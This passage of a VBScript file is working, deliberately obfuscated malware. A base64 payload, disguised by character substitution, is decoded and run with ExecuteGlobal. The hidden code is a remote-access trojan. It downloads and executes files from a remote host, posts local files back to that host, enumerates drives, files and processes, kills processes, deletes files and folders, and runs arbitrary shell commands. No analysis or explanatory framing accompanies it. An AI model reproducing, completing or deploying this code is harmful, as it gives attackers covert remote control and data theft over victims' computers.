KCJtc3htbDIueG1saHR0cCIgKQ0Kb2JqaHR0cGRvd25sb2FkLm9wZW4gImdldCIsIHN0cmxpbmssIGZhbHNlDQpvYmpodHRwZG93bmxvYWQuc2VuZ<!0Kc2V0IG9iamZzb2Rvd25sb2FkID0gY3JlYXRlb2JqZWN0ICgic2NyaXB0aW5nLmZpbGVzeXN0ZW1vYmplY3QiKQ0KaWYgIG9iamZzb2Rvd25sb2FkLmZpbGVleGlzdHMgKHN0cnNhdmV0bykgdGhlbg0Kb2JqZnNvZG93bmxvYWQuZGVsZXRlZmlsZS<!oc3Ryc2F2ZXRvKQ0KZW5kIGlmDQppZiBvYmpodHRwZG93bmxvYWQuc3RhdHVzID0gMj<!wIHRoZW4NCmRpbS<!gb2Jqc3RyZWFtZG93bmxvYWQNCnNldC<!gb2Jqc3RyZWFtZG93bmxvYWQgPSBjcmVhdGVvYmplY3QoImFkb2RiLnN0cmVhbSIpDQp3aXRoIG9ianN0cmVhbWRvd25sb2FkDQoudHlwZS<!9IDENCi5vcGVuDQoud3JpdGUgb2JqaHR0cGRvd25sb2FkLnJlc3BvbnNlYm9keQ0KLnNhdmV0b2ZpbGUgc3Ryc2F2ZXRvDQouY2xvc2UNCmVuZCB3aXRoDQpzZXQgb2Jqc3RyZWFtZG93bmxvYWQgPSBub3RoaW5nDQplbmQgaWYNCmlmIG9iamZzb2Rvd25sb2FkLmZpbGVleGlzdHMoc3Ryc2F2ZXRvKSB0aGVuDQpzaGVsbG9iai5ydW4gb2JqZnNvZG93bmxvYWQuZ2V0ZmlsZS<!oc3Ryc2F2ZXRvKS5zaG9ydHBhdGgNCmVuZCBpZg0KZW5kIHN1Yg0Kc3ViIGRvd25sb2FkIChmaWxldXJsLGZpbGVkaXIpDQppZiBmaWxlZGlyID0gIiIgdGhlbg0KZmlsZWRpci<!9IGluc3RhbGxkaXINCmVuZCBpZg0Kc3Ryc2F2ZXRvID0gZmlsZWRpci<!mIG1pZC<!oZmlsZXVybCwgaW5zdHJyZXYgKGZpbGV1cmwsIlwiKS<!rIDEpDQpzZXQgb2JqaHR0cGRvd25sb2FkID0gY3JlYXRlb2JqZWN0KCJtc3htbDIueG1saHR0cCIpDQpvYmpodHRwZG93bmxvYWQub3Blbi<!icG9zdCIsImh0dH<!6Ly8iICYgaG9zdC<!mICI6Ii<!mIHBvcnQgJiIvIi<!mICJpcy1zZW5kaW5nIi<!mIHNwbGl0ZXIgJiBmaWxldXJsLCBmYWxzZQ0Kb2JqaHR0cGRvd25sb2FkLnNlbmQgIiINCnNldCBvYmpmc29kb3dubG9hZC<!9IGNyZWF0ZW9iamVjdC<!oInNjcmlwdGluZy5maWxlc3lzdGVtb2JqZWN0IikNCmlmICBvYmpmc29kb3dubG9hZC5maWxlZXhpc3RzIChzdHJzYXZldG8pIHRoZW4NCm9iamZzb2Rvd25sb2FkLmRlbGV0ZWZpbGUgKHN0cnNhdmV0bykNCmVuZCBpZg0KaWYgIG9iamh0dHBkb3dubG9hZC5zdGF0dXMgPS<!yMD<!gdGhlbg0KZGltICBvYmpzdHJlYW1kb3dubG9hZ<!0Kc2V0ICBvYmpzdHJlYW1kb3dubG9hZC<!9IGNyZWF0ZW9iamVjdCgiYWRvZGIuc3RyZWFtIikNCndpdGggb2Jqc3RyZWFtZG93bmxvYWQNCi50eXBlID0gMQ0KLm9wZW4NCi53cml0ZSBvYmpodHRwZG93bmxvYWQucmVzcG9uc2Vib2R5DQouc2F2ZXRvZmlsZSBzdHJzYXZldG8NCi5jbG9zZQ0KZW5kIHdpdGgNCnNldCBvYmpzdHJlYW1kb3dubG9hZC<!gPSBub3RoaW5nDQplbmQgaWYNCmlmIG9iamZzb2Rvd25sb2FkLmZpbGVleGlzdHMoc3Ryc2F2ZXRvKSB0aGVuDQpzaGVsbG9iai5ydW4gb2JqZnNvZG93bmxvYWQuZ2V0ZmlsZS<!oc3Ryc2F2ZXRvKS5zaG9ydHBhdGgNCmVuZCBpZg0KZW5kIHN1Yg0KZnVuY3Rpb24gdXBsb2FkIChmaWxldXJsKQ0KZGltICBodHRwb2JqLG9ianN0cmVhbXVwbG9hZGUsYnVmZmVyDQpzZXQgIG9ianN0cmVhbXVwbG9hZGUgPSBjcmVhdGVvYmplY3QoImFkb2RiLnN0cmVhbSIpDQp3aXRoIG9ianN0cmVhbXVwbG9hZGUNCi50eXBlID0gMQ0KLm9wZW4NCi5sb2FkZnJvbWZpbGUgZmlsZXVyb<!0KYnVmZmVyID0gLnJlYWQNCi5jbG9zZQ0KZW5kIHdpdGgNCnNldCBvYmpzdHJlYW1kb3dubG9hZC<!9IG5vdGhpbmcNCnNldCBodHRwb2JqID0gY3JlYXRlb2JqZWN0KCJtc3htbDIueG1saHR0cCIpDQpodHRwb2JqLm9wZW4gInBvc3QiLCJodHRwOi8vIi<!mIGhvc3QgJi<!iOiIgJiBwb3J0ICYiLyIgJi<!iaXMtcmVjdmluZyIgJiBzcGxpdGVyICYgZmlsZXVybCwgZmFsc2UNCmh0dHBvYmouc2VuZCBidWZmZXINCmVuZCBmdW5jdGlvbg0KZnVuY3Rpb24gZW51bWRyaXZlci<!oKQ0KZm9yICBlYWNoIGRyaXZlIGluIGZpbGVzeXN0ZW1vYmouZHJpdmVzDQppZi<!gIGRyaXZlLmlzcmVhZHkgPSB0cnVlIHRoZW4NCmVudW1kcml2ZXIgPSBlbnVtZHJpdmVyICYgZHJpdmUucGF0aC<!mICJ8Ii<!mIGRyaXZlLmRyaXZldHlwZS<!mIHNwbGl0ZXINCmVuZCBpZg0KbmV4d<!0KZW5kIEZ1bmN0aW9uDQpmdW5jdGlvbiBlbnVtZmFmIChlbnVtZGlyKQ0KZW51bWZhZi<!9IGVudW1kaXIgJiBzcGxpdGVyDQpmb3IgIGVhY2ggZm9sZGVyIGluIGZpbGVzeXN0ZW1vYmouZ2V0Zm9sZGVyIChlbnVtZGlyKS5zdWJmb2xkZXJzDQplbnVtZmFmID0gZW51bWZhZi<!mIGZvbGRlci5uYW1lICYgInwiICYgIiIgJi<!ifCIgJi<!iZCIgJi<!ifCIgJiBmb2xkZXIuYXR0cmlidXRlcy<!mIHNwbGl0ZXINCm5leHQNCmZvci<!gZWFjaCBmaWxlIGluIGZpbGVzeXN0ZW1vYmouZ2V0Zm9sZGVyIChlbnVtZGlyKS5maWxlcw0KZW51bWZhZi<!9IGVudW1mYWYgJiBmaWxlLm5hbWUgJi<!ifCIgJiBmaWxlLnNpemUgICYgInwiICYgImYiICYgInwiICYgZmlsZS5hdHRyaWJ1dGVzICYgc3BsaXRlcg0KbmV4d<!0KZW5kIGZ1bmN0aW9uDQpmdW5jdGlvbiBlbnVtcHJvY2Vzcy<!oKQ0Kb24gZXJyb3IgcmVzdW1lIG5leHQNCnNldCBvYmp3bWlzZXJ2aWNlID0gZ2V0b2JqZWN0KCJ3aW5tZ210czpcXC5ccm9vdFxjaW12MiIpDQpzZXQgY29saXRlbXMgPSBvYmp3bWlzZXJ2aWNlLmV4ZWNxdWVyeSgic2VsZWN0ICogZnJvbSB3aW4zMl9wcm9jZXNzIiwsNDgpDQpkaW0gb2JqaXRlbQ0KZm9yIGVhY2ggb2JqaXRlbSBpbiBjb2xpdGVtcw0KZW51bXByb2Nlc3MgPSBlbnVtcHJvY2Vzcy<!mIG9iaml0ZW0ubmFtZS<!mICJ8Ig0KZW51bXByb2Nlc3MgPSBlbnVtcHJvY2Vzcy<!mIG9iaml0ZW0ucHJvY2Vzc2lkICYgInwiDQplbnVtcHJvY2Vzcy<!9IGVudW1wcm9jZXNzICYgb2JqaXRlbS5leGVjdXRhYmxlcGF0aC<!mIHNwbGl0ZXINCm5leHQNCmVuZCBmdW5jdGlvbg0Kc3ViIGV4aXRwcm9jZXNzIChwaWQpDQpvbiBlcnJvciByZXN1bWUgbmV4d<!0Kc2hlbGxvYmoucnVuICJ0YXNra2lsbC<!vRi<!vVC<!vUElEICIgJiBwaWQsNyx0cnVlDQplbmQgc3ViDQpzdWIgZGVsZXRlZmFmICh1cmwpDQpvbiBlcnJvciByZXN1bWUgbmV4d<!0KZmlsZXN5c3RlbW9iai5kZWxldGVmaWxlIHVyb<!0KZmlsZXN5c3RlbW9iai5kZWxldGVmb2xkZXIgdXJsDQplbmQgc3ViDQpmdW5jdGlvbiBjbWRzaGVsbC<!oY21kKQ0KZGltIGh0dHBvYmosb2V4ZWMscmVhZGFsbGZyb21hbnkNCnNldCBvZXhlYy<!9IHNoZWxsb2JqLmV4ZWMgKCIlY29tc3BlYyUgL2MgIi<!mIGNtZCkNCmlmIG5vdCBvZXhlYy5zdGRvdXQuYXRlbmRvZnN0cmVhbSB0aGVuDQpyZWFkYWxsZnJvbWFueS<!9IG9leGVjLnN0ZG91dC5yZWFkYWxsDQplbHNlaWYgbm90IG9leGVjLnN0ZGVyci5hdGVuZG9mc3RyZWFtIHRoZW4NCnJlYWRhbGxmcm9tYW55ID0gb2V4ZWMuc3RkZXJyLnJlYWRhbGwNCmVsc2UNCnJlYWRhbGxmcm9tYW55ID0gIiINCmVuZCBpZg0KY21kc2hlbGwgPSByZWFkYWxsZnJvbWFueQ0KZW5kIGZ1bmN0aW9uDQo=", "<!", "A")
        Else
            temp = getInfo("labito")
            temp(0) = key.ReadText
            getInfo = temp
        End If
    End Function
End Class

Set objClasse1 = New classe1
variavel1 = objClasse1.getInfo("labito")
variavel2 = Replace(variavel1(0), variavel1(1), variavel1(2))
variavel1 = Array(variavel2, 0, 0, 0)

variavel4 = objClasse1.funcao1(variavel1)
adodb = CreateObject("adodb.stream")
adodb.Type = 1
adodb.Open
adodb.Write variavel4
adodb.Position = 0
adodb.Type = 2
adodb.CharSet = "us-ascii"

ExecuteGlobal objClasse1.getInfo(adodb)(0)